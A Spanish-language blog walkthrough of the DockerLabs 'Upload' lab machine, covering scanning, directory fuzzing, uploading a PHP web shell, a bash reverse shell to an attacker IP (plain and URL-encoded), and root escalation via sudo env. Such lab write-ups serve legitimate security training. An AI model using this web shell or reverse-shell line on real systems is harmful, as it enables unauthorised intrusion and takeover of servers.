---
layout: post
title: Maquina Upload
subtitle: DockerLabs
header-img: img/in-post/2020-10-07/upload-dl.png
header-style: text
catalog: true
tags:
  -  DockerLabs
  -  Web Fuzzing
  -  Binarios UNIX
  -  Arbitrary File Upload
  -  Reverse Shell
---

#### **Información**
- **Máquina:** Upload
- **Creador:** El Pingüino de Mario
- **SO:** Linux
- **Dificultad:** Easy

#### **Configuración Entorno**
Lo primero que hacemos es descargarnos los archivos de dockerlabs de la maquina.
![Image 1](https://aanton94.github.io/blog/img/Upload/Img1.png)

Una vez descargado ejecutamos el siguiente script:
![Image 2](https://aanton94.github.io/blog/img/Upload/Img2.png)

**auto_deploy.sh:** este archivo se encarga de desplegar la máquina mediante docker y,
una vez presionamos `ctrl+c`{:.info} pasa a un proceso de borrado, todo automático, sin necesidad de tener conocimientos de docker.

**upload.tar:** contiene todo el contenido de la máquina docker; es el corazón, donde está la máquina víctima.

#### **Reconocimiento**
Lo primero que realizamos es lanzar un ping contra la IP de la maquina para comprobar que tenemos conectividad.
```bash
ping -c 1 172.17.0.2
```
![Image 3](https://aanton94.github.io/blog/img/Upload/Img3.png)

Podemos observar que el ttl es de 64, por tanto, como norma general podemos afirmas que se trata de una maquina linux.

Una vez comprobada la conectividad, inciaremos un escaneo con nmap, para detectar puertos abiertos y lo almacenaremos en un fichero llamado scan, con el siguiente comando:

```bash
nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn -oN scan
```
- **-p-** --> Busqueda de puertos abiertos
- **--open** --> Enumera los puertos abiertos
- **-sS** --> Es un modo de escaneo rapido
- **-sC** --> Que use un conjunto de scripts de reconocimiento
- **-sV** --> Que encuentre la version del servicio abirto
- **--min-rate=5000** --> Hace que el reconocimiento aun vaya mas rapido mandando no menos de 5000 paquetes
- **-n** --> No hace resolución DNS
- **-Pn** --> No hace ping
- **-vvv** --> Muestra en pantalla a medida que encuentra puertos (Verbose)

![Image 4](https://aanton94.github.io/blog/img/Upload/Img4.png)

Podemos observar que solo cuenta con el puerto 80 abierto, al acceder via web nos encontramos con lo siguiente:
![Image 5](https://aanton94.github.io/blog/img/Upload/Img5.png)

Nos encontramos con un campo que nos permite subir un archivo, por lo tanto, tratamos de subir un fichero de prueba:
![Image 6](https://aanton94.github.io/blog/img/Upload/Img6.png)

Recibimos un mensaje de que el archivo se ha subido correctamente. A continuación, realizaremos fuzzing de la web para poder localizar posibles directorios. Utilizaremos la herramienta de fuzzing `gobuster`{:.info} aunque podríamos utilizar cualquier otra de este estilo, para ello utilizaremos un diccionario de directorios comunes.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```
![Image 7](https://aanton94.github.io/blog/img/Upload/Img7.png)

Al finalizar el fuzzing encontramos el directorio uploads, tratamos de acceder y podemos ver que en este directorio se almaceno el fichero que subimos anteriormente.
![Image 8](https://aanton94.github.io/blog/img/Upload/Img8.png)

Comprobamos que podemos abrir el fichero en el navegador.
![Image 9](https://aanton94.github.io/blog/img/Upload/Img9.png)

Por tanto, al tener una ruta donde podemos subir y abrir ficheros, intentaremos subir un fichero con codigo php malicioso para tratar de lograr ejecutar comandos de forma remota.

#### **Explotación**

Para la explotación vamos a crear un archivo php llamado cmd.php con el siguiente código:

```php
<?php
	system($_GET['cmd']);
?>
```

Este script PHP ejecuta un comando del sistema recibido a través de la variable GET llamada 'cmd'. Por lo tanto, puede ser una puerta de entrada para ejecutar comandos maliciosos si no se filtran adecuadamente las entradas del usuario.

Subimos el fichero cmd.php, nos dirigimos al directorio uploads y vemos que al leer el fichero el servidor ejecuta el codigo php, utilizamos la variable cmd definida en el script para ejecurar el comando `whoami`{:.info}.
![Image 10](https://aanton94.github.io/blog/img/Upload/Img10.png)

Y efectivamente, nos devuelve que es usuario es **www-data**, por lo tanto, confirmamos que tenemos ejecución remota de comandos, abusando de esta brecha de seguridad podemos intentar abrir una revese shell contra el servidor víctima.

Para ello pondremos nuestra maquina atacante en escucha por el puerto 4444 utilizando netcat:

```bash
nc -lvnp 4444
```
Y ejecutaremos una revese shell a través del script de php cmd.php subido anteriormente.

`http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >& /dev/tcp/192.168.199.131/4444 0>&1"`{:.info}

Al ejecutarlo no nos funciona, por tanto, la volvemos a pasar, pero esta vez aplicando un URL Encode:

`http://172.17.0.2/uploads/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.199.131%2F4444%200%3E%261%22`{:.info}

Y recibimos la reverse shell en el puerto que teníamos en escucha.
![Image 11](https://aanton94.github.io/blog/img/Upload/Img11.png)

Una vez tenemos la revese shell es hora de realizar el tratamiento de la TTY, ya que nos facilitara el manejo al no matar la shell al ejecutar control+c, control+l, etc.

Para ello ejecutamos los siguientes comandos:

```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Una vez realizado comenzaremos con la escalada de privilegios, lo primero que hacemos siempre es revisar que binarios puede ejecutar nuestro usuario como `root`{:.error}, para ello ejecutamos `sudo -l`{:.info}.
![Image 12](https://aanton94.github.io/blog/img/Upload/Img12.png)

Vemos que podemos ejecutar el binario `/usr/bin/env`{:.info} como usuario `root`{:.error}, sin necesidad de conocer su contraseña. Para explotarlo podemos utilizar la web [http://https://gtfobins.github.io/](http://https://gtfobins.github.io/) y buscar la forma de explotar dicho binario. En este caso simplemente tenemos que ejecutar `sudo env /bin/sh`{:.info}
![Image 13](https://aanton94.github.io/blog/img/Upload/Img13.png)

Y efectivamente, somo `root`{:.error}, por lo tanto, `¡¡¡maquina vulnerada!!!`{:.success} :smirk::smirk::smirk:

#### **Eliminación del entorno**

Para borrar la máquina solo debemos ir a la consola donde lo desplegamos y presionar `ctrl+c`{:.info} y eliminaría y borraría todo rastro de la máquina víctima en nuestro sistema LINUX.
![Image 14](https://aanton94.github.io/blog/img/Upload/Img14.png)

`¡¡¡Espero que os haya gustado y nos vemos en la próxima!!!`{:.success}
